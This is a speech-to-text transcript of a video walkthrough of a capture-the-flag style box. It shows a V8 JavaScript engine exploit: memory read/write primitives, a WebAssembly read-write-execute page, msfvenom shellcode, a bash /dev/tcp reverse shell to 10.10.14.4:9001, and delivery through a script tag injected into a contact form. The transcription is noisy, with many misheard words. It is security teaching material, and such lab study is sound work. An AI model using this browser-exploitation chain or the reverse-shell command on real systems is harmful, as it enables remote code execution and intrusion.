happens if we write a two let's just verify we're writing instead of two let's do three to make sure we skipped it so like one two skip a few thing so continue um right and we want to go here and three n or three so if i go back in gdb and we look at this address again it should be a three so now we have confirmed we can um read memory addresses and locations and write to them so we just have to find a read write execute page thankfully um faith has a good article here i can find where i'm at we're not going to overwrite the free hook we're going to use webassembly to create a read write execute page and this code is just like return 42 i believe if we look at uh webassembly fiddler we can turn it into a code buffer and then build we see it begins with 097 115 and if we go back to faith's page 097 115 and 65 42 11 65 42 11. so all this is doing is using web assembly to [Music] create a object and for some reason it decides to create it as read write execute so since it's read our execute we can use a fake object right to this spot and then put shell code there and execute the shell code normally this wouldn't work because a lot of the shell code gets terminated because of sandboxing but in this challenge sandboxing is disabled so essentially that's what we do um the one thing we're gonna have to do at this point is get the isolate route which is i believe gonna be the backing store address so uh this syntax is almost identical i think the only thing we have to change is this 20 to make it a bit smaller so uh let's see where is this let's add this into opponent.js so vpwn.js uh set paste so now we will be able to create a um what is it read write execute page and we need to do um ver read write execute page address sql two we read address of the wasm or webassembly instance and we gotta go up a bit so let's just run this real quick so run okay and then debug print wasm instance and let's look at this in memory so uh telescope this minus one and i think this highlights um let's see no it doesn't i was wondering what these highlights were but let's also do vm map and we're gonna look for the read write execute so i'm just gonna search for that and we want to look at start so we're going to look at this and then search again for that address and we see at 68 spaces away from the wasm instance that's where our read write execute page is and this is going to be constant so inner prone script this is a dress of wasm instance and we just add 68. so plus 0x68n clears that out close that out okay console log found pointer to wasm instance 0x plus addr of wasm instance dot to string okay i did that right yep so let's see we can do the read write page so address of and this will be rwx page address that may be a bit easier logically so when we run this this should be where our read write execute pages let's just verify this uh wasm instance i forgot to edit rdx page address so that's just going to be the value of this and i don't have a good way to actually show the next piece off dot my head so we're just going to leave it this so this would be the pointer to this guy which points to our read write execute page so now we can do shell code and there's going to be one piece here that we have to change i think i said it before that 20 needs to be changed so let's paste this code here and then we're going to figure out exactly what that does so first it creates a new array buffer then creates a data view and it gets the address of where buffer is located using an address of primitive and then it uses the backing store and i think this is just a place where like the variable is pointed to that's not affected by point of compression but i'm not a hundred percent positive but we need this and um in faith's machine it was at the buffer address plus 20. now all these memory addresses have been changing because the point of compression so let's step through this and see if or is that offset 20 or it said something different spoiler it's somewhere different so easiest way to do that is through the debug and then we want to uh run a thing we don't need the pwn.js because i honestly think we left pwn.js in a broken state because it started crashing on us and we switched to release so now we want to grab this and then set it uh copy ctrl shift okay sometimes the clipboard is wonky and then we want to set this then we want to just put some data in here so dataview dot set unsign in 32 uh let's put four a's uh i don't know why i did zrx there uh copy and then we can copy this piece okay so let's debug print on buff to get the address and what the data store address is so we're here and we want to know where the backing store is so let's go over to gdb and do x slash 16 w and we'll copy this address minus one to untag the pointer xw there we go and we want to look for uh let's say 31b zero so copy so we want to get to here and we are here so this is um 4 8 12 16 20 and 20 in decimal is uh let's see 10 is 16 so 14. so 0x14 to get there so this is the place we want so we change our code to be 14. that's in the wrong one prone.js so now we have the correct backing store address so now that all is left is we just have to get some shell code copy it over and um run it we'll use msf venom to create the shell code so i'm just going to put that as a blank space now but we call copy shell code and our rwx page address and then the shell code and then f will execute it so let's switch over to parrot and we can run msf venom dash p linux x64 exec cmd is equal to user bin touch temp pwned okay and we want to do format d word and i just want to make sure tampon doesn't already exist on my machine because as i said this is the second run through of this box because the first part of the video i just didn't think it looked well wasn't nearly as polished and said a lot of wrong things properly i probably said wrong things here too but probably less so so pw so now we're just doing ls on temp pw to try to show us when it's created and we can go back to this copy this shellcode and we will paste it in okay so now that's one happy big variable so let's run it am i in i'm in release shellpone.js and initial urbrite uh we use different functions than um what should we call it faith did we just call it herb we just got it right we don't have a or b anywhere it crashed and we don't have it i wonder if it just doesn't work in gdb shell paren.js sweet we got the file so now the next step is to get shell code to reverse shell so this will be um touch tab compound it's always nice to hand uh save it actually the best way to do it is this if you're documenting okay so the next thing we need is reverse shell code so let's just go up cmd bin bash dash c bash dash i devtcp 10 10 14 i'm probably dot four i think this store connected the vpn it is 10 10 14 4. and i could copy this to my parrot machine and do it um it doesn't really matter zero at and one and the double quote single quote is ended that should be good while we wait we can just copy this piece i don't know what hotkey i hit see two oh we're on a different vm grab this shell code come on highlight copy go over here and we just have to make sure everything is on one line there we go so nc lvmp one two three four is that what i did uh that's bad shell code um shoot uh we want 9001 okay wait for this to copy and grab this copy let's go here and add 9001 paste and get rid of everything there we go and hope this works sweet we got a shell so now the next step to do is we'll test it on a browser so if we go to 10 10 10 196 uh port 8000 we should be able to download chrome and i have it already downloaded and extracted actually so if i go into downloads we go into chrome we can try executing it and this piece first time it's not going to work because we're going to do something that most browsers have enabled so let's see v index.html html head script source is equal to pwn.js slash script slash head slash html thank you color coding for telling me i forgot that piece so now let's copy um was it documents v8 x64 or alp.gn x64 release phone js i'll make third w dub move index and pawn to dub dub dub python3 dash m http server nclvnp9001 so if we go to localhost 8000 something went wrong loading this webpage we see we got it and it hit pwn.js but something bad happened we have a stack trace and i'm showing this because sometimes when people run chrome on cali as root or something they always do this dash dash no dash sandbox flag and i'm showing you the sandbox is preventing this from getting code execution because it's blocking the call to exec but if we pass it the no sandbox flag and we go to this page again we get over a shell so now the last thing to do is see if this works on the target so if we go to the contact us page test test and we do script source equals um http 10 10 14 4 pound.js like that i think you send it uh we did not say 8001 or 8000 for the web server report send we got parent.js but we did not get a shell let's see is that what it wants there we go so we have getpone.js and a shell on rope2 as the chrome user and you could go here and go into ssh or makeder ssh and drop an ssh key and begin doing the box but that's gonna be it for this video um hopefully one day i'll do the user and the root i wasn't too familiar with binary exploitation in general and all these are pretty tough binary exploitation challenges so i wanted to make sure i just did one super well instead of rushing through a heap challenge and then a kernel exploit challenge so hopefully you guys enjoyed the v8 and this made sense um i promise you if i did this whole video the other v8 stuff i had was garbage um i spent a whole day figuring out how i want to do this video so take care guys i hope you enjoyed it and i will see you all next week